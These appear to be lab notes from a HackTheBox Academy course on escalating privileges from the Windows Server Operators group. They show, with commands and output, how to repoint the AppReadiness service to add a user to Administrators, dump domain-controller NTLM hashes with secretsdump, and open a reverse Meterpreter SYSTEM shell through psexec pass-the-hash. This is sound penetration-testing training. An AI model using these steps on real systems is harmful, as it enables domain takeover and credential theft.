# Server Operators
* Allows members to administer Windows servers without needing assignment of Domain Admin privileges
* Members of the Server Operators group typically have permissions to perform tasks such as restart/shut down domain controller, managing shared resources, managing services, managing printer queues
* Very high privileged group that can log in locally to servers
* Members are granted the `SeBackupPrivilege` and `SeRestorePrivilege` and the ability to control local services

## Querying the AppReadiness Service

### AppReadiness Service
* Ensure that applications are ready for use on Windows systems
* It handles various tasks related to the installation, update, and removal of applications, ensuring they are prepared and configured correctly for use

<pre>C:\htb> sc qc AppReadiness

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem</pre>

* Service starts as SYSTEM 

## Checking Service Permissions with PsService
* Use the service viewer/controller **PsService** which is part of the Sysinternals suite - to check permissions on the service
* **PsService** is similar to **sc** utility and can display service status and configurations - also allows you to start/stop/resume/pause/restart services both locally and remote

<pre>C:\htb> c:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Server Operators
                All</pre>

* Server Operators group has `SERVICE_ALL_ACCESS` - full control over the service

## Checking Local Admin Group Membership
* View the current members of the local administrators group
* Target account is not present

<pre>C:\htb> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.</pre>

## Modify the Service Binary Path
* Change the binary path to execute a command which adds our current user to the default local administrator group

<pre>C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS</pre>

## Starting the Service
* Starting the service fails - as expected

<pre>C:\htb> sc start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.</pre>

## Confirm Local Admin Group Membership
* Check membership of administrators group - command was executed successfully
* `server_adm` account has now been added

<pre>C:\htb> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.</pre>

## Confirm Local Admin Access on Domain Controller
* We have full control over the Domain Controller and could retrieve all credentials from the NTDS database and access other systems

<pre>Jinksbach1234@htb[/htb]$ crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'

SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)</pre>

## Retrieve NTLM Password Hashes from Domain Controller

<pre>Jinksbach1234@htb[/htb]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator</pre>

## PSExec - Pass the Hash - Metasploit
Pass-the-Hash is a credential theft and lateral movement technique in which an attacker abuses the NTLM authentication protocol to authenticate as a user without ever obtaining the account’s plaintext password.

<pre>msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.43.42
RHOSTS => 10.129.43.42
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
SMBUser => Administrator
msf6 exploit(windows/smb/psexec) > set LHOST tun0
LHOST => 10.10.14.240
msf6 exploit(windows/smb/psexec) > set SMBPass *************:*********************
SMBPass => *************:*********************
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.240:4444 
[*] 10.129.43.42:445 - Connecting to the server...
[*] 10.129.43.42:445 - Authenticating to 10.129.43.42:445 as user 'administrator'...
[*] 10.129.43.42:445 - Selecting PowerShell target
[*] 10.129.43.42:445 - Executing the payload...
[+] 10.129.43.42:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 10.129.43.42
[*] Meterpreter session 1 opened (10.10.14.240:4444 -> 10.129.43.42:61517) at 2024-06-03 13:28:43 +0100

meterpreter > shell
Process 2624 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system</pre>